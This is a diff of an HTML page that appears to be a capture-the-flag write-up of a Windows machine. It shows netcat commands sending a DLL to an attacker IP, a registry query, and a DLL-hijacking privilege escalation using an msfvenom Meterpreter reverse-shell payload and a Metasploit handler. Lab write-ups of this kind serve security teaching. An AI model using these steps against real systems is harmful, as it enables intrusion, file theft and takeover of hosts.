@@ -127,23 +127,23 @@ User flag on c:\Users\svc_exampanel\Desktop&gt;type user.txt
 <br /><br /></li>
   <li>There’s might be something interesting on ExaminationManagement.dll let’s move from here to c:\Users\svc_exampanel\Desktop because is there where we have permissions, use nc to download locally to reverse it.
 <br /><br />
-```bash
-nc -lnvp4444 &gt;  ExaminationManagement.dll
-.\nc.exe 10.10.14.000 4444 -w 3 &lt;  ExaminationManagement.dll</li>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp4444</span> <span class="o">&gt;</span>  ExaminationManagement.dll
+.<span class="se">\n</span>c.exe 10.10.14.000 4444 <span class="nt">-w</span> 3 &lt;  ExaminationManagement.dll
+</code></pre></div>    </div>
+  </li>
 </ul>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;br/&gt;&lt;br/&gt;
-&lt;aside&gt;
+<p><br /><br /></p>
+<aside>
 🪡 We’ll use dnSpy to reverse dll
 
-&lt;/aside&gt;
-&lt;br/&gt;&lt;br/&gt;
-We can see there’s a key which is saved on the local machine specifically on (Software\\MedDigi)  
-&lt;br/&gt;&lt;br/&gt;
-![Untitled](/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_5.png)
-&lt;br/&gt;&lt;br/&gt;
-```bash
-reg query HKEY_LOCAL_MACHINE\Software\MedDigi
+</aside>
+<p><br /><br />
+We can see there’s a key which is saved on the local machine specifically on (Software\MedDigi)<br />
+<br /><br />
+<img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_5.png" alt="Untitled" />
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKEY_LOCAL_MACHINE<span class="se">\S</span>oftware<span class="se">\M</span>edDigi
 </code></pre></div></div>
 <p><br /><br /></p>
 <ul>
@@ -185,31 +185,30 @@ We found what is the dll’s route and a dll called externalupload which we can 
 <br /><br />
 icacls to check premises and we have write permissions, so we can make a beautiful dll hijacking
 <br /><br />
-<img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_12.png" alt="Untitled" />
-<br /><br />
-—
-<br /><br /></p>
-    <blockquote>
-      <p>Once we finalize recognition let’s exploit the vulnerability and  escalate privileges</p>
+<img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_12.png" alt="Untitled" /></p>
+  </li>
+</ul>
 
-      <ol>
-        <li>We are gonna make the evil dll using msfvenom tool, we use -p to specify payload type(Meterpeter). Our local host will be a network interface (tun0) which will receive the reverse connection -f says the outgoing format
+<p><br /><br />
+Once we finalize recognition let’s exploit the vulnerability and  escalate privileges</p>
+
+<p>We are gonna make the evil dll using msfvenom tool, we use -p to specify payload type(Meterpeter). Our local host will be a network interface (tun0) which will receive the reverse connection -f says the outgoing format
 <br /><br />
 <img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_13.png" alt="Untitled" />
-<br /><br /></li>
-        <li>We are going to listen using metasploit. We use this tool because it help us to get connections from multiple kinds of payloads made by using MSFVenom with multi/handler
+<br /><br />
+We are going to listen using metasploit. We use this tool because it help us to get connections from multiple kinds of payloads made by using MSFVenom with multi/handler
 <br /><br />
 <img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_14.png" alt="Untitled" />
-<br /><br /></li>
-        <li>Upload the dll
+<br /><br />
+Upload the dll
 <br /><br />
 <img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_15.png" alt="Untitled" />
-<br /><br /></li>
-        <li>Start a port forwarding to execute commands in a service running locally
+<br /><br />
+Start a port forwarding to execute commands in a service running locally
 <br /><br />
 <img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_16.png" alt="Untitled" />
-<br /><br /></li>
-        <li>Establishing port forwarding.
+<br /><br />
+Establishing port forwarding.
 <br /><br />
 <img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_17.png" alt="Untitled" />
 <br /><br />
@@ -217,11 +216,7 @@ Use net cat to run the service and upload our malicious dll
 <br /><br />
 <img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_18.png" alt="Untitled" />
 <br /><br />
-Machine pwned!!</li>
-      </ol>
-    </blockquote>
-  </li>
-</ul>
+Machine pwned!!</p>
 
 <p><img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_19.png" alt="Untitled" /></p>
 
